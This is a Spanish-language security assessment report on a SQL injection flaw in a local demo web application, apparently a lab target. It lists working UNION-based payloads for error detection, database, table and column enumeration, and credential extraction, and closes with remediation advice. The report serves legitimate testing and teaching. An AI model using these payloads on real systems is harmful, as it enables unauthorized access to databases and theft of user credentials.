# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:40:01  
**Tipo de análisis:** SQL Injection (Manual + Explotación)

---

## Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` de la aplicación web. La vulnerabilidad permite a un atacante extraer toda la información de la base de datos, incluyendo credenciales de usuarios.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (UNION-based / Error-based) |
| **Severidad** | Crítica |
| **Parámetro afectado** | `id` (GET) |
| **URL vulnerable** | `http://web.dev.local:8083/?id=<PAYLOAD>&Submit=Submit` |
| **CVSS Score** | 9.8 (Crítico) |

### Descripción Técnica

La aplicación no sanitiza el parámetro `id` antes de incluirlo en la consulta SQL. El archivo `/var/www/html/low.php` construye la consulta de forma insegura:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

---

## Evidencia de Explotación

### 1. Detección - Error SQL

**Payload:** `1'`  
**Respuesta:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

### 2. Extracción de versión y base de datos activa

**Payload:** `-1' UNION SELECT version(),database()-- -`  
**Resultado:**
- **Versión DBMS:** `10.11.14-MariaDB-ubu2204`
- **Base de datos activa:** `sqli_demo`

### 3. Enumeración de bases de datos

**Payload:** `-1' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata-- -`  
**Bases de datos encontradas:**
- `information_schema`
- `sqli_demo`
- `sys`
- `mysql`
- `performance_schema`

### 4. Enumeración de tablas

**Payload:** `-1' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema='sqli_demo'-- -`  
**Tablas en `sqli_demo`:**
- `users`

### 5. Enumeración de columnas

**Payload:** `-1' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_schema='sqli_demo' AND table_name='users'-- -`  
**Columnas en `users`:**
- `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

### 6. Extracción de credenciales

**Payload:** `-1' UNION SELECT group_concat(username,':',password SEPARATOR '|'),group_concat(email) FROM sqli_demo.users-- -`

**Credenciales extraídas:**

| Usuario | Contraseña | Email |
|---------|-----------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

---

## Impacto

- **Confidencialidad:** Exposición completa de todos los datos de la base de datos (credenciales, emails)
- **Integridad:** Posible modificación de datos mediante sentencias INSERT/UPDATE/DELETE
- **Disponibilidad:** Posible eliminación de datos o denegación de servicio

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Validar que el parámetro `id` sea numérico antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos solo debe tener los permisos estrictamente necesarios.

4. **Deshabilitar mensajes de error detallados** en producción para no revelar información del sistema.

5. **Implementar WAF** (Web Application Firewall) como medida adicional de protección.

---

## Conclusión

La aplicación presenta una vulnerabilidad de SQL Injection clásica de nivel crítico. La explotación fue exitosa y permitió extraer todas las credenciales almacenadas en la base de datos `sqli_demo`. Se requiere corrección inmediata mediante el uso de consultas preparadas.
